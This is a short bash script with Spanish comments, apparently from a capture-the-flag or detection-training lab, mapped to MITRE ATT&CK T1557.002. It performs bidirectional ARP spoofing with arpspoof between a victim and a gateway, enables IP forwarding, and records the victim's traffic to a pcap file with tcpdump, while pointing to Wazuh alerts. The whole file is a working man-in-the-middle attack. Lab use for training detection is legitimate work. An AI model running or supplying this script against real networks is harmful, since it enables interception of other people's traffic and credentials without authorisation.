#!/bin/bash
# ============================================================
# 02_arp_poison.sh - ARP Spoofing bidireccional
# MITRE ATT&CK T1557.002
# CTF-FLAG-ARP-02
# ============================================================
source /opt/mitm-scripts/targets.sh

VICTIM="${1:-$WORKSTATION_IP}"
GATEWAY="${2:-$WEBSERVER_IP}"
IFACE="${3:-eth0}"

echo "[*] === ARP SPOOFING ==="
echo "[*] Victima  : $VICTIM"
echo "[*] Gateway  : $GATEWAY"
echo "[*] Interfaz : $IFACE"
echo ""

echo 1 > /proc/sys/net/ipv4/ip_forward

tcpdump -i $IFACE host $VICTIM \
  -w /tmp/arp_capture_$(date +%Y%m%d_%H%M%S).pcap &
TCPDUMP_PID=$!

arpspoof -i $IFACE -t $VICTIM $GATEWAY &
ARP1_PID=$!
arpspoof -i $IFACE -t $GATEWAY $VICTIM &
ARP2_PID=$!

echo "[*] ARP Spoofing activo. Ctrl+C para detener."
echo "[!] Observa las alertas en Wazuh: SID 9000001"

trap "kill $ARP1_PID $ARP2_PID $TCPDUMP_PID 2>/dev/null
      echo 0 > /proc/sys/net/ipv4/ip_forward
      echo '[+] Detenido. Revisa /tmp/arp_capture_*.pcap'" INT
wait
